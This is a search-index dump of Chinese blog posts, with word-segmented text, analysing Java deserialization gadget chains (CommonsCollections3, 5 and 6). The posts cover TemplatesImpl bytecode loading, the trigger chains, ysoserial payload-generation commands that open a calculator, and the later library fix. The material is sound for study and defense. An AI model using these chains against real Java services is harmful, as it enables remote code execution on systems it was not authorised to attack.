makeClassInitializer   ( ) .   insertAfter   (   code   ) ;   return   clazz   .   toBytecode   ( ) ;   / /   ...   }   public   static   void   main   (   String   [ ]   args   )   {   byte   [ ]   clazz   =   generate   ( ) ;   DefiningClassLoader   loader   =   new   DefiningClassLoader   ( ) ;   Class   cls   =   loader   .   defineClass   (   \" demo \"   ,   clazz   ) ;   / /   \u4ece \u5b57\u8282 \u6570\u7ec4 \u4e2d \u6062\u590d \u7c7b   try   {   cls   .   newInstance   ( ) ;   / /   \u5b9e\u4f8b \u5316 \u8be5\u7c7b \u65f6\u4f1a \u81ea\u52a8 \u8c03\u7528 \u9759\u6001 \u5757 \u5185 \u7684 \u4ee3\u7801   }   / /   ...   }   }   \u901a\u8fc7 \u4e0a\u9762 \u8fd9\u4e2a \u4f8b\u5b50 \uff0c \u6211\u4eec \u53ef\u4ee5 \u83b7\u5f97 \u7684 \u77e5\u8bc6 \u77e5\u8bc6\u70b9 \u4e3b\u8981 \u4e3a \u4e24\u70b9 \uff1a   \u200b   a .   defineClass \u53ef\u4ee5 \u4ece byte \u6570\u7ec4 \u4e2d \u6062\u590d \u4e00\u4e2a Class   \u200b   b .   static   initializer \u5728 \u7c7b \u8f7d\u5165 \u65f6 \u5c06 \u81ea\u52a8 \u6267\u884c \uff08 \u9759\u6001 \u5757 \u5185 \u7684 \u4ee3\u7801 \uff09   Java \u4e2d \u52a8\u6001 \u8c03\u7528 \u7684 \u53e6 \u4e00\u79cd \u65b9\u5f0f \u662f   defineClass   Java \u63d0\u4f9b \u4e86 ClassLoader \u4ece bytes \u6570\u7ec4 \u4e2d \u8fd8\u539f Class \u7684 \u65b9\u6cd5 \uff0c defineClass \u51fd\u6570 \u5c31\u662f \u5b8c\u6210 \u8fd9\u4e00 \u8fc7\u7a0b \u7684 \u51fd\u6570 \u3002   \u7406\u8bba \u4e0a \uff0c \u5982\u679c \u4ee3\u7801 \u4e2d \u4f7f\u7528 \u4e86 \u8fd9\u79cd \u65b9\u5f0f \uff0c \u4e14 byte \u6570\u636e \u7684 \u5185\u5bb9 \u53ef\u63a7 \uff0c \u6211\u4eec \u53ef\u4ee5 \u6267\u884c \u4efb\u610f Java \u4ee3\u7801 \u3002 \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u5462 \uff1f   \u8fd9\u91cc \u7528\u5230 \u5c31\u7528\u5230 \u4e86 Java \u7c7b \u7684 \u53e6 \u4e00\u4e2a \u7279\u6027 \uff0c static   block \u5728 \u7c7b \u8f7d\u5165 \u65f6 \u81ea\u52a8 \u6267\u884c \u5757 \u5185 \u7684 \u4ee3\u7801 \u3002 \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 javassist \u5bf9 \u9759\u6001 \u5757 \u6ce8\u5165 \u4efb\u610f \u4ee3\u7801 \uff0c \u8be5\u7c7b \u88ab \u6062\u590d \u5e76 \u8f7d\u5165 \u65f6\u4f1a \u8c03\u7528 \u6ce8\u5165 \u7684 \u4ee3\u7801 \uff0c \u540e\u6587 \u7684 \u5229\u7528 \u94fe \u4e3b\u8981 \u5c31\u662f \u7528\u5230 \u4e86 \u8fd9 \u4e24\u4e2a \u77e5\u8bc6 \u77e5\u8bc6\u70b9 \u3002","title":"0x02   \u57fa\u7840\u77e5\u8bc6"},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#0x03","text":"","title":"0x03   \u5229\u7528 \u94fe\u5206\u6790"},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#1","text":"\u8fd9\u91cc \u9009\u62e9 CommonsCollections3 \u56e0\u4e3a \u662f\u56e0\u4e3a \u4ed6 \u7684 \u524d\u534a \u534a\u6bb5 \u524d\u534a\u6bb5 \u89e6\u53d1 \u7684 \u5229\u7528 \u94fe \u8ddf CommonsCollections1 \u662f \u4e00\u6837 \u7684 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u53ea \u9700\u8981 \u5206\u6790 \u540e\u534a \u534a\u6bb5 \u540e\u534a\u6bb5 \u547d\u4ee4 \u6267\u884c \u7684 \u6784\u9020 \u5373\u53ef \u3002 \u56de\u987e \u4e00\u4e0b \u524d\u534a \u534a\u6bb5 \u524d\u534a\u6bb5 \u5229\u7528 \u94fe   sun . reflect . annotation . AnnotationInvocationHandler . readObject ( )   - >   memberValues . entrySet ( )   - >   AnnotationInvocationHandler . invoke ( )   - >   memberValues . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   iTransformers [ ] . transform ( )   CommonsCollections1 \u4e2d ChainedTransformer . transform ( ) \u4f1a \u5faa\u73af \u8c03\u7528 iTransformers \u6570\u7ec4 \u91cc \u7684 \u5bf9\u8c61 \u7684 transform \u51fd\u6570 \u3002 CommonsCollections1 \u7528 \u7684 \u662f InvokerTransformer \u7684 transform \uff0c \u56e0\u4e3a \u8be5 \u51fd\u6570 \u5b9e\u73b0 \u4e86 \u53cd\u5c04 \u8c03\u7528 \u4efb\u610f \u7c7b \u7684 \u529f\u80fd \u3002 \u90a3\u4e48 \u9664\u4e86 \u4f7f\u7528 InvokerTransformer \u8fd8\u6709 \u6ca1\u6709 \u5176\u4ed6 \u7684 \u65b9\u6cd5 \uff1f \u7b54\u6848 \u5f53\u7136 \u662f \u80af\u5b9a \u7684 \uff01","title":"1 .   \u524d\u666f \u56de\u987e"},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#2","text":"\u6765\u770b \u4e00\u4e0b CommonsCollections3 \u7684 payloads \u6784\u9020   Object   templatesImpl   =   Gadgets   .   createTemplatesImpl   (   command   ) ;   / /   real   chain   for   after   setup   final   Transformer   [ ]   transformers   =   new   Transformer   [ ]   {   new   ConstantTransformer   (   TrAXFilter   .   class   ) ,   new   InstantiateTransformer   (   new   Class   [ ]   {   Templates   .   class   } ,   new   Object   [ ]   {   templatesImpl   }   ) } ;   / /   \u540e\u7eed \u7c7b\u4f3c   \u7701\u7565   ConstantTransformer   \u4e0a \u4e00\u7bc7 \u5df2\u7ecf \u8bf4 \u8fc7 \u4e86 \uff0c \u5176   transform   \u4f1a \u8fd4\u56de \u6784\u9020 \u65f6 \u7684 \u5bf9\u8c61 \uff0c \u8fd9\u91cc \u5c31\u662f   TrAXFilter . class   \u5bf9\u8c61 \u3002   \u6211\u4eec \u91cd\u70b9 \u6765\u770b   InstaniateTransformer   \u7684   transform   \u51fd\u6570   \u7b80\u5355 \u6765\u770b \uff0c \u8be5 \u51fd\u6570 \u5bf9 \u8f93\u5165 \u7684 input \uff08 \u8fd9\u91cc \u5c31\u662f TrAXFilter . class \uff09 \u505a \u5b9e\u4f8b \u5316 \u7684 \u64cd\u4f5c \u3002 \u8fd9\u91cc \u770b\u8d77 \u8d77\u6765 \u770b\u8d77\u6765 \uff0c \u5176\u5b9e \u6709\u70b9 \u6709\u70b9\u50cf php \u4e2d \u627e \u5bf9\u5e94 \u7684 __ constructs \uff0c \u5728 Java \u91cc \u6211\u4eec \u5c31 \u53bb \u627e \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u91cc \u505a \u4e86 \u5371\u9669 \u64cd\u4f5c \u7684 class \u3002   \u6765\u770b \u4e00\u4e0b   TrAXFilter   \u7c7b \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570   \u8fd9\u91cc \u7684   templates   \u5c31\u662f \u4e0a\u9762 exp \u4e2d \u6784\u9020 \u7684   templatesImpl   .   \u7ee7\u7eed \u770b TransformerImpl \u7684 newTransformer \u51fd\u6570   org . apache . xalan . internal . xsltc . trax . TemplatesImpl . java : newTransformer : 481   \u7ee7\u7eed \u770b   getTransletInstance   \u518d \u7ee7\u7eed   defineTransletClasses   \u770b\u5230 \u8fd9\u91cc \u4e0d\u662f \u662f\u4e0d\u662f \u6709\u70b9 \u719f\u6089 \uff0c \u6ca1\u9519 \uff0c \u8fd9\u91cc \u7528\u5230 \u4e86 0x02 \u4e2d \u7684 \u4e24\u4e2a \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6 \u3002   defineTransletClasses   \u8fd8\u539f \u51fa\u7c7b \uff0c   getTransletInstance   \u8fdb\u884c \u5b9e\u4f8b \u5316 \u3002 \u90a3\u4e48 \u6211\u4eec \u53ea \u9700\u8981 \u6784\u9020 \u4e00\u4e2a \u5408\u9002 \u7684   _ bytecodes   \u5373\u53ef \u6267\u884c \u4efb\u610f Java \u4ee3\u7801 \u3002   \u4e0b\u9762 \u8865\u5145 \u4e00\u4e0b \uff0c \u5728 \u6784\u9020 exp \u65f6 \u9700\u8981 \u6ee1\u8db3 \u7684 \u6761\u4ef6 \uff1a   \u690d\u5165 \u7684   templates   \u4e3a   TransformerImpl   \u7c7b \uff0c \u4ece\u800c \u8c03\u7528 \u540e\u7eed \u7684   newTransformer   \u51fd\u6570   \u690d\u5165 \u7684   templates   \u5b9e\u4f8b \uff0c   _ name   \u4e0d \u4e3a   null   ,   _ class   \u4e3a   null   \u690d\u5165 \u7684   templates   \u5b9e\u4f8b \uff0c   _ bytecodes   \u4e0d \u4e3a   null   ,   _ tfactory   \u4e3a   TransformerFactoryImpl   \u5bf9\u8c61   \u690d\u5165 \u7684   templates ._ bytecodes   \u6570\u7ec4 \uff0c \u5176 \u6700\u7ec8 \u8fd8\u539f \u7684 \u5bf9\u8c61 \u7236\u7c7b \u4e3a   com . sun . org . apache . xalan . internal . xsltc . runtime . AbstractTranslet   \u90a3\u4e48 \u600e\u4e48 \u624d\u80fd \u6ee1\u8db3 \u8fd9\u4e9b \u6761\u4ef6 \u5462 \uff1f \u8fd9\u91cc \u795e\u5947 \u7684 javassist \u53c8 \u8981 \u4e0a\u573a \u5566 \uff01   \u6765\u770b \u4e00\u4e0b ysoserial \u7684 \u64cd\u4f5c   \u4e0a\u9762 \u7684 \u4ee3\u7801 \u4e0d \u505a \u7701\u7565 \uff0c \u6211\u4eec \u5e94\u8be5 \u597d\u597d \u597d\u5b66 \u5b66\u4e60 \u597d\u597d\u5b66 \u597d\u597d\u5b66\u4e60 \u4e00\u4e0b javassist \u7684 \u57fa\u672c \u64cd\u4f5c \u57fa\u672c\u64cd\u4f5c \uff0c \u4ee3\u7801 \u53ef\u4ee5 \u5728   Gadgets . createTemplatesImpl   \u627e\u5230 \uff01   \u8fd9\u91cc \u6846 \u4e86 \u4e24\u4e2a \u6846 \uff0c \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u6846\u662f \u901a\u8fc7 javassist \u6ce8\u5165 \u9759\u6001 \u5757 \uff0c \u9759\u6001 \u5757 \u7684 \u5185\u5bb9 \u5c31\u662f \u6211\u4eec \u9700\u8981 \u6267\u884c \u7684 \u547d\u4ee4 \u3002 \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u6846\u662f ysoserail \u6846\u67b6 \u81ea\u5df1 \u5c01\u88c5 \u7684 \u4e00\u4e2a \u53cd\u5c04 \u5de5\u5177 \u7c7b \uff0c \u901a\u8fc7 \u8fd9\u4e2a \u7c7b \u6211\u4eec \u53ef\u4ee5 \u52a8\u6001 \u7684 \u64cd\u4f5c   templates   \u5b9e\u4f8b \u7684 \u7c7b \u5c5e\u6027 \u5185\u5bb9 \u3002 \u8fd9\u91cc \u4e3b\u8981 \u5c31\u662f \u5728 \u6ee1\u8db3 \u4e0a\u8ff0 \u7684 \u51e0\u4e2a \u6761\u4ef6 \u3002   \u8fd9\u91cc \u6709 \u4e00\u70b9 \u53ef\u4ee5 \u63d0 \u4e00\u4e0b \uff0c \u8be5 \u5229\u7528 \u94fe \u7684 \u4f5c\u8005 \u5728 \u586b\u5145   _ bytecodes   \u65f6 \uff0c \u989d\u5916 \u586b\u5145 \u4e86 \u4e00\u4e2a \u65e0\u5173 \u7684 \u7c7b ( \u4e0a\u56fe \u7b2c 130 \u884c ) \u3002 \u8fd9\u4e2a \u7c7b \u4e3b\u8981 \u7528\u4e8e \u6ee1\u8db3   _ auxClasses   , \u8ba9 \u8fd9\u4e2a   getTransletInstance   \u51fd\u6570 \u80fd \u6b63\u5e38 \u8d70 \u5b8c \u3002   \u7ecf\u8fc7 \u4e0a\u9762 \u7684 \u5206\u6790 \uff0c \u5176\u5b9e \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053   getTransletInstance   \u7684 \u7b2c 408 \u884c \uff0c \u5bf9   _ class   \u505a \u5b9e\u4f8b \u5316 \u65f6 \u6211\u4eec \u60f3\u8981 \u6267\u884c \u7684 \u4ee3\u7801 \u5c31 \u5df2\u7ecf \u6267\u884c \u4e86 \u3002 \u6240\u4ee5 \u8fd9\u91cc \u989d\u5916 \u586b\u5145 \u7684 \u7c7b \u5176\u5b9e \u662f \u53ef\u6709 \u53ef\u65e0 \u53ef\u6709\u53ef\u65e0 \u7684 \u3002","title":"2 .   \u65b0 \u7684 \u547d\u4ee4 \u6267\u884c \u5229\u7528 \u94fe"},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#0x04","text":"\u5230 \u8fd9\u91cc \uff0c \u6574\u4e00 \u4e00\u4e2a \u6574\u4e00\u4e2a CommonsCollections3 \u5c31 \u5206\u6790 \u7ed3\u675f \u4e86 \u3002   CommonsCollections3 \u4e3b\u8981 \u5229\u7528 \u4e86 \u53ef\u63a7 \u7684 byte \u6570\u7ec4 \u4ece defineClass \u51fd\u6570 \u4e2d \u8fd8\u539f \u51fa \u6076\u610f \u6784\u9020 \u7684 Class \u3002 \u5e76\u4e14 \u5728 \u540e\u7eed \u7684 \u8c03\u7528 \u4e2d \uff0c \u8fd9\u4e2a Class \u88ab \u6ce8\u5165 \u5230 \u5185\u5b58 \u4e2d \uff0c \u4ece\u800c \u6267\u884c \u4e86 \u6ce8\u5165 \u7684 \u9759\u6001 \u5757 \u7684 \u4ee3\u7801 \uff0c \u5b9e\u73b0 \u4e86 \u4efb\u610f Java \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u3002   \u5230 \u8fd9\u7bc7 \u4e3a\u6b62 \uff0c \u6211\u4eec \u5df2\u7ecf \u77e5\u9053 \u4e86 \u4e24\u79cd Java \u7684 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u7684 \u6784\u9020 \u65b9\u5f0f   \u5229\u7528 \u53ef\u63a7 \u7684 \u53cd\u5c04 \u673a\u5236 \u3002 \u5177\u4f53 \u7684 Class \u3001 Method \u7b49 \u5747 \u53ef\u63a7 \u65f6 \uff0c \u5229\u7528 \u53cd\u5c04 \u673a\u5236 \uff0c \u53ef\u4ee5 \u6784\u9020 \u51fa \u4efb\u610f \u7684 \u7c7b \u8c03\u7528 \u3001 \u7c7b \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528   \u5229\u7528 \u53ef\u63a7 \u7684 defineClass \u51fd\u6570 \u7684 byte \u6570\u7ec4 \u3002 \u6784\u9020 \u6076\u610f \u7684 Class \u5b57\u8282 \u7801 \u6570\u7ec4 \uff0c \u5e38\u4e8e \u9759\u6001 \u5757 \u6ce8\u5165 \u6076\u610f \u4ee3\u7801 \u6076\u610f\u4ee3\u7801","title":"0x04   \u603b\u7ed3"},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#20191104","text":"\u524d\u9762 \u7684 \u5206\u6790 \u5e76 \u6ca1\u6709 \u63d0\u5230 3.2 . 2 \u7248\u672c \u53d1\u751f \u4e86 \u5565\u4e8b \uff0c \u5bfc\u81f4 \u4e86 \u5229\u7528 \u94fe \u7684 \u5931\u6548 \uff0c \u8fd9\u91cc \u7b80\u5355 \u63d0 \u4e00\u4e0b   3.2 . 2 \u7248\u672c \u5bf9 InvokerTransformer \u589e\u52a0 \u4e86 readObject \u51fd\u6570 \uff0c \u5e76\u4e14 \u505a \u4e86 \u662f\u5426 \u5141\u8bb8 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u68c0\u67e5 \uff0c \u5728   FunctorUtils . checkUnsafeSerialization   \u51fd\u6570 \u5185 \u3002   \u8fd9\u91cc UNSAFE _ SERIALIZABLE _ PROPERTY \u7684 \u503c \u9ed8\u8ba4 \u4e3a false \uff0c \u5982\u679c \u9700\u8981 \u4e3a true \uff0c \u9700\u8981 \u5728 \u8fd0\u884c \u65f6 \u6307\u5b9a \u3002   \u6240\u4ee5 \u5728 \u4f7f\u7528 InvokerTransformer \u4f5c\u4e3a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u65f6 \uff0c \u4f1a throw \u4e00\u4e2a exception \u3002 \u9664\u4e86 InvokerTransformer \u7c7b\u5916 \uff0c \u8fd8\u6709 CloneTransformer ,   ForClosure ,   InstantiateFactory ,   InstantiateTransformer ,   InvokerTransformer ,   PrototypeCloneFactory ,   PrototypeSerializationFactory ,   WhileClosure \u3002 \u6240\u4ee5 \u5728 3.2 . 2 \u7248\u672c \u4ee5\u4e0a \uff0c \u57fa\u672c \u57fa\u672c\u4e0a \u5229\u7528 \u94fe \u90fd \u5df2\u7ecf \u5e9f \u4e86 \u3002   \u5f53\u7136 \uff0c \u8fd9\u79cd \u65b9\u6cd5 \u6cbb\u6807 \u4e0d\u6cbb \u6cbb\u672c \u6cbb\u6807\u4e0d\u6cbb\u672c \uff0c \u5982\u679c \u53ef\u4ee5 \u5728 \u8fd9\u4e9b \u7c7b \u4ee5\u5916 \uff0c \u6784\u9020 \u4e00\u4e2a \u5229\u7528 \u94fe \u540c\u6837 \u53ef\u4ee5 \u8fbe\u5230 \u524d\u9762 \u7684 \u6548\u679c \u3002","title":"20191104   \u8865\u5145"},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/","tags":["java"],"text":"0x00   \u524d\u8a00   \u672c\u6587 \u7ee7\u7eed \u5206\u6790 CommonsCollections \u7684 \u76f8\u5173 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff0c \u8fd9\u6b21 \u4e3b\u8981 \u5206\u6790 CommonsCollections5 , 6 , 7 \uff0c \u4ee5\u53ca \u6211 \u627e \u7684 \u4e00\u4e2a \u65b0 \u5229\u7528 \u94fe \uff0c \u8fd9\u91cc \u6682\u4e14 \u5c06 \u5176 \u79f0\u4e3a 10 .   0x01   \u73af\u5883 \u51c6\u5907   jdk8 \uff0c commons - collections : 3.1   java   - jar   ysoserial - master - 30099844c6 - 1 . jar   CommonsCollections5   \" open   / System / Applications / Calculator . app \"   >   commonscollections5 . ser   java   - jar   ysoserial - master - 30099844c6 - 1 . jar   CommonsCollections6   \" open   / System / Applications / Calculator . app \"   >   commonscollections6 . ser   java   - jar   ysoserial - master - 30099844c6 - 1 . jar   CommonsCollections7   \" open   / System / Applications / Calculator . app \"   >   commonscollections7 . ser   0x02   \u5229\u7528 \u5206\u6790 \u94fe\u5206\u6790   1 .   \u80cc\u666f \u56de\u987e   \u524d\u9762 \u63d0\u5230 \u8fc7 CommonsCollections1 \u548c 3 \u5728 \u6784\u9020 AnnotationInvocationHandler \u65f6 \u7528\u5230 \u4e86 Override . class \u3002 \u4f46\u662f \u5982\u679c \u4f60 \u5728 jdk8 \u7684 \u73af\u5883 \u4e0b\u53bb \u8f7d\u5165 \u751f\u6210 \u7684 payload \uff0c \u4f1a \u53d1\u751f   java . lang . Override   missing   element   entrySet   \u7684 \u9519\u8bef \u3002   \u8fd9\u4e2a \u9519\u8bef \u7684 \u4ea7\u751f \u539f\u56e0 \u4e3b\u8981 \u5728\u4e8e jdk8 \u66f4\u65b0 \u4e86   AnnotationInvocationHandler   \u53c2\u8003   jdk8 \u4e0d \u76f4\u63a5 \u8c03\u7528   s . defaultReadObject   \u6765 \u586b\u5145 \u5f53\u524d \u7684   AnnotaionInvocationHandler   \u5b9e\u4f8b \uff0c \u800c \u9009\u62e9 \u4e86 \u5355\u72ec \u586b\u5145 \u65b0 \u7684 \u53d8\u91cf \u3002   \u8fd9\u91cc \u6211\u4eec \u56de\u987e \u4e00\u4e0b \uff0c 1 \u548c 3 \u7684 payload \u7684 \u89e6\u53d1 \u70b9 \u662f   LazyMap . get   \u51fd\u6570 \uff0c \u800c \u89e6\u53d1 \u8fd9\u4e2a \u51fd\u6570 \u9700\u8981 \u4f7f\u5f97   memberValues   \u4e3a   LazyMap   \u5bf9\u8c61   \u663e\u7136 \uff0c jdk8 \u7684 \u64cd\u4f5c \u4f7f\u5f97   memberValues   \u5e76 \u4e0d\u662f \u6211\u4eec \u6784\u9020 \u597d \u7684   LazyMap   \u7c7b\u578b \u3002 \u5728 \u8c03\u8bd5 \u4e2d \uff0c \u53ef\u4ee5 \u770b\u5230 \u6b64\u65f6 \u7684   memberValues   \u4e3a   LinkedHashMap   \u5bf9\u8c61 \uff0c \u8be5 \u5bf9\u8c61 \u65e0\u6cd5 \u83b7\u5f97   entrySet   \u7684 \u5185\u5bb9 \uff0c \u6240\u4ee5 \u4f1a \u62a5 \u524d\u9762 \u7684 \u8fd9\u4e2a \u9519\u8bef \u3002   jdk8 \u4e0b CommonsCollections1 \u548c 3 \u65e0\u6cd5 \u6210\u529f \u5229\u7528 \u4e86 \uff0c \u4f46\u662f \u5982\u679c \u6211\u4eec \u53ef\u4ee5 \u627e\u5230 \u4e00\u4e2a \u66ff\u4ee3 AnnotationInvocationHandler \u7684 \u5229\u7528 \u65b9\u5f0f \u5462 \uff1f \u8fd9 \u5c31\u662f \u672c\u6587 \u8981 \u8bb2 \u7684 CommonsCollections5 \uff0c 6 \uff0c 7 \u6240 \u505a\u51fa \u7684 \u6539\u53d8 \u3002   2 .   \u91cd\u65b0 \u6784\u9020 \u524d\u534a \u534a\u90e8 \u524d\u534a\u90e8 \u5206 \u5229\u7528 \u94fe -- CommonsCollections5   CommonsCollections5 \u4e0e 1 \u7684 \u533a\u522b \u5728\u4e8e AnnotationInvocationHandler \uff0c \u540e \u90e8\u5206 \u662f \u76f8\u540c \u7684 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u4e0d \u5206\u6790 \u540e \u90e8\u5206 \u3002   AnnotationInvocationHandler \u5728 \u524d\u9762 \u8d77\u5230 \u7684 \u4f5c\u7528 \u662f \u6765 \u89e6\u53d1 LazyMap . get \u51fd\u6570 \uff0c \u6240\u4ee5 \u6211\u4eec \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u8981 \u91cd\u65b0 \u627e \u4e00\u4e2a \u53ef\u4ee5 \u89e6\u53d1 \u8be5 \u51fd\u6570 \u7684 \u5bf9\u8c61 \u3002 \u8fd9\u4e2a \u5bf9\u8c61 \u6ee1\u8db3   \u7c7b \u53ef \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u7c7b \u5c5e\u6027 \u6709\u4e2a \u53ef\u63a7 \u7684 Map \u5bf9\u8c61 \u6216 Object   \u8be5\u7c7b \u7684 \u7c7b \u51fd\u6570 \u4e0a \u6709 \u8c03\u7528 \u8fd9\u4e2a Map . get \u7684 \u5730\u65b9   CommonsCollections5 \u5728 \u8fd9\u91cc \u7528\u5230 \u4e86 TiedMapEntry \uff0c \u6765\u770b \u4e00\u4e0b   TiedMapEntry \u6709 \u4e00\u4e2a map \u7c7b \u5c5e\u6027 \uff0c \u4e14 \u5728 getValue \u5904 \u8c03\u7528 \u4e86 map . get \u51fd\u6570 \u3002 \u540c\u65f6 toString \u3001 hashCode \u3001 equals \u5747 \u8c03\u7528 \u4e86 getValue \u51fd\u6570 \uff0c \u8fd9\u91cc \u5173\u6ce8 toString \u51fd\u6570 \u3002   toString \u51fd\u6570 \u901a\u5e38 \u5728 \u4e0e \u5b57\u7b26 \u5b57\u7b26\u4e32 \u62fc\u63a5 \u65f6 \uff0c \u4f1a \u88ab \u81ea\u52a8 \u8c03\u7528 \u3002 \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u6211\u4eec \u9700\u8981 \u627e \u4e00\u4e2a \u5bf9\u8c61 \u6ee1\u8db3   \u7c7b \u53ef \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u7c7b \u5c5e\u6027 \u6709\u4e2a Map . Entry \u5bf9\u8c61 \u6216 Object   \u8be5\u7c7b \u4f1a \u81ea\u52a8 \u8c03\u7528 \u8fd9\u4e2a \u7c7b \u5c5e\u6027 \u7684 toString \u51fd\u6570 \u6216 \u524d\u9762 \u7684 \u53e6\u5916 \u51e0\u79cd   \u8fd9\u91cc \u9009\u62e9 \u4e86   BadAttributeValueExpException   \u5bf9\u8c61 \uff0c \u4ed6 \u7684   readObject   \u51fd\u6570 \u4f1a \u81ea\u52a8 \u8c03\u7528 \u7c7b \u5c5e\u6027 \u7684   toString   \u51fd\u6570 \u3002   \u9700\u8981 \u6ce8\u610f \u7684 \u662f \u8fd9\u91cc   System . getSecurityManager   \u4e3a\u7a7a \uff0c \u6362\u53e5 \u6362\u53e5\u8bdd \u6362\u53e5\u8bdd\u8bf4 \uff0c \u5c31\u662f \u5f53\u524d \u7684 jvm \u73af\u5883 \u4e0d\u80fd \u542f\u7528 \u5b89\u5168 \u7ba1\u7406 \u7406\u5668 \u7ba1\u7406\u5668 \u3002   \u6765\u770b \u4e00\u4e0b \u4e00 \u6574\u4e2a \u8c03\u7528 \u94fe   BadAttributeValueExpException . readObject ( )   - >   valObj . toString ( )   = >   TiedMapEntry . getValue   - >   TiedMapEntry . map . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )   3 .   \u91cd\u65b0 \u6784\u9020 \u524d\u534a \u534a\u90e8 \u524d\u534a\u90e8 \u5206 \u5229\u7528 \u94fe -- CommonsCollections6   CommonsCollections6 \u662f \u53e6 \u4e00\u79cd \u66ff\u6362 \u65b9\u5f0f \uff0c \u540e \u534a \u90e8\u5206 \u7684 \u5229\u7528 \u94fe \u8fd8\u662f \u6ca1\u6709 \u53d8 \uff0c \u4e0d \u4f5c \u5206\u6790 \u3002   \u6211\u4eec \u5728 2 \u4e2d \u63d0\u5230 \u4e86 \u9664\u4e86 CommonsCollections5 \u7528 \u7684   toString   \u5916 \uff0c \u8fd8\u6709   hashCode   \u548c   equals   \u51fd\u6570 \u4e5f \u8c03\u7528 \u4e86 getValue \u51fd\u6570 \u3002 \u90a3\u4e48 \u662f\u5426 \u5b58\u5728 \u8c03\u7528 \u8fd9 \u4e24\u4e2a \u51fd\u6570 \u7684 \u5bf9\u8c61 \u51fd\u6570 \u5462 \uff1f \u7b54\u6848 \u662f \u80af\u5b9a \u7684 \uff01   CommonsCollections6 \u5229\u7528 \u4e86   TiedMapEntry   \u7684   hashCode   \u51fd\u6570 \uff0c \u6765 \u89e6\u53d1   LazyMap . get   \u6211\u4eec \u90fd \u77e5\u9053 HashSet \u96c6\u5408 \u91cc \u4e0d\u4f1a \u5b58\u5728 \u76f8\u540c \u7684 key \uff0c \u90a3\u4e48 \u662f \u5982\u4f55 \u5224\u65ad \u662f\u5426 \u662f\u5426\u662f \u76f8\u540c \u7684 key \u5462 \uff1f \u8fd9\u91cc \u5c31\u8981 \u7528\u5230 key \u7684 hashCode \u51fd\u6570 \u4e86 \uff0c \u5982\u679c key \u7684 \u503c \u76f8\u540c \uff0c \u5176 hashCode \u8fd4\u56de \u7684 \u503c \u4e5f \u662f \u76f8\u540c \u7684 \u3002 \u8fd9\u91cc \u7684 HashCode \u7684 \u8ba1\u7b97 \u5728 HashSet \u7684 put \u548c add \u51fd\u6570 \u5b8c\u6210 \uff0c \u5e76\u4e14 HashSet \u4ece \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u4e2d \u8fd8\u539f \u51fa\u6765 \u65f6\u4f1a \u81ea\u52a8 \u8c03\u7528 put \u51fd\u6570 \uff0c \u8fd9\u91cc \u5c31 \u7ed9 \u6211\u4eec \u63d0\u4f9b \u4e86 \u53ef\u63a7 \u7684 \u5730\u65b9 \u3002   \u5148 \u6765\u770b \u4e00\u4e0b HashSet \u7684   readObject   \u51fd\u6570   \u7ee7\u7eed \u8ddf put \u51fd\u6570 \uff0c \u8fd9\u91cc \u5176\u5b9e \u8c03\u7528 \u7684 \u662f HashMap \u7684 put \u51fd\u6570   \u5176\u4e2d \u5bf9 key \u8c03\u7528 \u7684   hash ( )   \u51fd\u6570 \u4f1a \u8c03\u7528   key . hashCode   \u51fd\u6570 \uff0c \u90a3\u4e48 \u73b0\u5728 \u5c31 \u5f88 \u6e05\u695a \u4e86 \uff0c \u6211\u4eec \u53ea\u8981 \u5c06 key \u7684 \u503c \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 \u6784\u9020 \u597d \u7684   TiedMapEntry   \u5bf9\u8c61 \u5c31 \u53ef\u4ee5 \u4e86 \u3002 \u6ce8\u610f \uff0c \u8fd9\u91cc \u7684 key \u503c \u5176\u5b9e \u5c31\u662f   HashSet . add   \u7684 \u5b9e\u4f8b \uff0c \u5728 HashSet \u91cc \u7684 HashMap \u7c7b \u5c5e\u6027 \u53ea\u7528 \u5230 \u4e86 Key \u3002   \u6574\u7406 \u4e00\u4e0b \u5229\u7528 \u94fe   HashSet . readObject ( )   - >   HashMap . put ( key )   = >   key . hashCode   = >   TiedMapEntry . hashCode   - >   TiedMapEntry . getValue   - >   TiedMapEntry . map . get ( )   = >   LazyMap . get ( )   - >   factory . transform ( )   = >   ChainedTransformer . transform ( )   - >   \u524d \u6587 \u6784\u9020 \u7684 Runtime . getRuntime ( ) . exec ( )   4 .   \u91cd\u65b0 \u6784\u9020 \u524d\u534a \u534a\u90e8 